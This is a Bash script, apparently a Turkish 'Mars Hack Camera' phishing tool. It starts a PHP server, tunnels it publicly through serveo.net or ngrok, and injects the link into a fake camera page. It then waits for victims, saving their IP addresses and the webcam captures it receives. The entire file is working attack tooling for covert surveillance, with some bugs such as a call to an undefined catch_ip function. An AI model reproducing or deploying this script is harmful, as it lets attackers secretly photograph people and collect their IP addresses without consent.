trap 'printf "\n";stop' 2

banner() {

printf "\e[1;91m█▀▄▀█ ██   █▄▄▄▄   ▄▄▄▄▄   \e[0m\e[1;92m ▄  █ ██   ▄█▄    █  █▀     ▄█▄    ██   █▀▄▀█ ▄███▄   █▄▄▄▄ ██   \e[0m\n"
printf "\e[1;91m█ █ █ █ █  █  ▄▀  █     ▀▄ \e[0m\e[1;92m█   █ █ █  █▀ ▀▄  █▄█       █▀ ▀▄  █ █  █ █ █ █▀   ▀  █  ▄▀ █ █  \e[0m\n"
printf "\e[1;91m█ ▄ █ █▄▄█ █▀▀▌ ▄  ▀▀▀▀▄   \e[0m\e[1;92m██▀▀█ █▄▄█ █   ▀  █▀▄       █   ▀  █▄▄█ █ ▄ █ ██▄▄    █▀▀▌  █▄▄█ \e[0m\n"
printf "\e[1;91m█   █ █  █ █  █  ▀▄▄▄▄▀    \e[0m\e[1;92m█   █ █  █ █▄  ▄▀ █  █      █▄  ▄▀ █  █ █   █ █▄   ▄▀ █  █  █  █ \e[0m\n"
printf "\e[1;91m   █     █   █             \e[0m\e[1;92m   █     █ ▀███▀    █       ▀███▀     █    █  ▀███▀     █      █ \e[0m\n"
printf "\e[1;91m  ▀     █   ▀              \e[0m\e[1;92m  ▀     █          ▀                 █    ▀            ▀      █  \e[0m\n"
printf "\e[1;91m       ▀                   \e[0m\e[1;92m       ▀                            ▀                        ▀   \e[0m\n"



printf " \e[1;95m v1.0 Coded By Mars \e[0m \n"

printf "\n"

}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

1()  {

command -v php > /dev/null 2>&1 || { echo >&2 "PHP'yi Yüklemen Gerekiyor! iptal ediliyor..."; exit 1; }

}

hedef_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS:$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

}

kontrol() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hedef Bekleniyor, \e[0m\e[1;77m Ctrl + C ye Bas çıkış \e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Hedef Bağlantıyı Açtı !\n"
catch_ip
rm -rf ip.txt

fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam Dosyası Alındı!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "PHP'yi Yüklemen Gerekiyor! iptal ediliyor..."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Server Başlatılıyor...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Php Server Başlatılıyor... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1 &
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direkt link:\e[0m\e[1;77m %s\n' $send_link

}

payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' marshackcamera.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php

}

ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else

command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip Yüklemen Gerekiyor, iptal ediliyor.."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Wget Yüklemen Gerekiyor, iptal ediliyor.."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok Yükleniyor..\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] İndirme Başarısız.. Linux, şunu yazın:\e[0m\[1;77m sudo apt-get install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[]1;91m[!] İndirme Başarısız.. \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Php Server Başlatılıyor...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok Server Başlatılıyor...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direkt link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
kontrol
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Bir Bağlantı Noktası Yönlendirme seçeneği belirleyin: ' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "SSH Yüklemen Gerekiyor, iptal ediliyor..."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Geçersiz Seçenek!\e[0m\n"
sleep 1
clear
start1
fi

}

payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' marshackcamera.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

Geçerli_seçenek="E"
Geçerli_subdomain="marshackcamera$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] subdomain Seçin (Geçerli:\e[0m\e[1;77m [E/h] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${Geçerli_seçenek}}"
if [[ $choose_sub == "E" || $choose_sub == "e" || $choose_sub == "Evet" || $choose_sub == "evet" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${Geçerli_subdomain}}"
fi

server
payload
kontrol

}

banner
1
start1


